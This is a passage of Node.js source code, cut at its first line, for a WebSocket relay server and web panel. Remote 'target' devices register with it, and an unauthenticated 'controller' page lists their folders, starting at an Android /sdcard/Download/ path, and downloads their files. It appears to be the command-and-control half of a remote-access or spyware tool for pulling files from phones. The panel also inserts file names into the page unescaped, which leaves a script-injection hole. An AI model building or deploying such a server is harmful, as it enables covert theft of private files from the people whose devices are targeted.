equire('express');
const http = require('http');
const { WebSocketServer, WebSocket } = require('ws');

const app = express();
const PORT = process.env.PORT || 3000;

// Store connected clients cleanly by type/ID
let targets = new Set();
let controllers = new Set();

app.get('/', (req, res) => {
    const isOnline = targets.size > 0;
    const statusText = isOnline ? '🟢 ONLINE (' + targets.size + ' target/s)' : '🔴 OFFLINE';
    
    const html = `<!DOCTYPE html>
<html>
<head>
    <title>Remote File Explorer</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: Arial, sans-serif; margin: 0; padding: 20px; background: #f4f4f9; color: #333; }
        .container { max-width: 600px; margin: auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
        h2 { margin-top: 0; color: #007bff; }
        .status { font-weight: bold; padding: 5px 10px; border-radius: 4px; display: inline-block; margin-bottom: 15px; }
        .online { background: #d4edda; color: #155724; }
        .offline { background: #f8d7da; color: #721c24; }
        input, button { padding: 10px; font-size: 16px; margin-top: 5px; box-sizing: border-box; }
        input { width: 70%; }
        button { width: 28%; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer; }
        button:hover { background: #0056b3; }
        ul { list-style: none; padding: 0; margin-top: 20px; }
        li { padding: 10px; border-bottom: 1px solid #eee; display: flex; justify-content: space-between; align-items: center; }
        li button { background: #28a745; width: auto; padding: 5px 10px; font-size: 14px; }
    </style>
</head>
<body>
    <div class="container">
        <h2>Remote File Manager</h2>
        <div>Target Status: <span id="status" class="status ${isOnline ? 'online' : 'offline'}">${statusText}</span></div>
        
        <div>
            <input type="text" id="pathInput" value="/sdcard/Download/" placeholder="Enter folder path">
            <button onclick="listDirectory()">List Files</button>
        </div>

        <ul id="fileList"></ul>
    </div>

    <script>
        const wsProtocol = location.protocol === 'https:' ? 'wss://' : 'ws://';
        const ws = new WebSocket(wsProtocol + location.host);
        const statusEl = document.getElementById('status');
        const fileListEl = document.getElementById('fileList');

        ws.onopen = () => {
            ws.send(JSON.stringify({ type: 'REGISTER_CONTROLLER' }));
        };

        ws.onmessage = (event) => {
            const data = JSON.parse(event.data);
            
            if (data.status === 'TARGET_STATUS') {
                statusEl.className = data.online ? 'status online' : 'status offline';
                statusEl.innerText = data.online ? '🟢 ONLINE' : '🔴 OFFLINE';
            }

            if (data.action === 'FILE_LIST') {
                fileListEl.innerHTML = '';
                if (data.files && data.files.length > 0) {
                    data.files.forEach(file => {
                        const li = document.createElement('li');
                        li.innerHTML = '<span>' + file + '</span> <button onclick="fetchFile(\\'' + file + '\\')">Download</button>';
                        fileListEl.appendChild(li);
                    });
                } else {
                    fileListEl.innerHTML = '<li>No files found or empty directory.</li>';
                }
            }

            if (data.action === 'FILE_DATA') {
                const binaryString = atob(data.content);
                const bytes = new Uint8Array(binaryString.length);
                for (let i = 0; i < binaryString.length; i++) {
                    bytes[i] = binaryString.charCodeAt(i);
                }
                const blob = new Blob([bytes], { type: 'application/octet-stream' });
                const link = document.createElement('a');
                link.href = URL.createObjectURL(blob);
                link.download = data.fileName;
                link.click();
            }
        };

        function listDirectory() {
            const path = document.getElementById('pathInput').value;
            ws.send(JSON.stringify({ action: 'LIST_FILES', path: path }));
        }

        function fetchFile(fileName) {
            const basePath = document.getElementById('pathInput').value;
            const fullPath = basePath.endsWith('/') ? basePath + fileName : basePath + '/' + fileName;
            ws.send(JSON.stringify({ action: 'FETCH_FILE', filePath: fullPath }));
            alert('Requesting file download...');
        }
    </script>
</body>
</html>`;
    res.send(html);
});

const server = http.createServer(app);
const wss = new WebSocketServer({ server });

function broadcastStatus() {
    const isOnline = targets.size > 0;
    const msg = JSON.stringify({ status: 'TARGET_STATUS', online: isOnline });
    controllers.forEach(client => {
        if (client.readyState === WebSocket.OPEN) client.send(msg);
    });
}

wss.on('connection', (ws) => {
    let clientType = 'UNKNOWN';

    ws.on('message', (message) => {
        const rawText = message.toString();
        console.log('RAW MESSAGE RECEIVED:', rawText); // <-- This will show us everything!

        try {
            const data = JSON.parse(rawText);

            if (data.type === 'REGISTER_TARGET' || data.role === 'target') {
                clientType = 'TARGET';
                targets.add(ws);
                console.log('Target Device registered successfully. Total targets:', targets.size);
                broadcastStatus();
                ws.send(JSON.stringify({ status: 'SUCCESS', role: 'TARGET' }));
                return;
            }

            if (data.type === 'REGISTER_CONTROLLER' || data.role === 'controller') {
                clientType = 'CONTROLLER';
                controllers.add(ws);
                console.log('Web Controller connected. Total controllers:', controllers.size);
                ws.send(JSON.stringify({ status: 'TARGET_STATUS', online: targets.size > 0 }));
                return;
            }

            // Route Controller -> Target
            if (clientType === 'CONTROLLER') {
                if (targets.size > 0) {
                    const targetArr = Array.from(targets);
                    const activeTarget = targetArr[targetArr.length - 1];
                    if (activeTarget.readyState === WebSocket.OPEN) {
                        activeTarget.send(JSON.stringify(data));
                    }
                } else {
                    ws.send(JSON.stringify({ action: 'FILE_LIST', files: ['ERROR: Target device is offline.'] }));
                }
            }

            // Route Target -> All Controllers
            else if (clientType === 'TARGET') {
                controllers.forEach(ctrl => {
                    if (ctrl.readyState === WebSocket.OPEN) {
                        ctrl.send(JSON.stringify(data));
                    }
                });
            }
        } catch (err) {
            console.error('Error handling message:', err.message);
        }
    });

    ws.on('close', () => {
        if (clientType === 'TARGET') {
            targets.delete(ws);
            console.log('Target Device disconnected. Remaining targets:', targets.size);
            broadcastStatus();
        } else if (clientType === 'CONTROLLER') {
            controllers.delete(ws);
            console.log('Web Controller disconnected.');
        }
    });
});


server.listen(PORT, () => {
    console.log(`Server listening on port ${PORT}`);
});
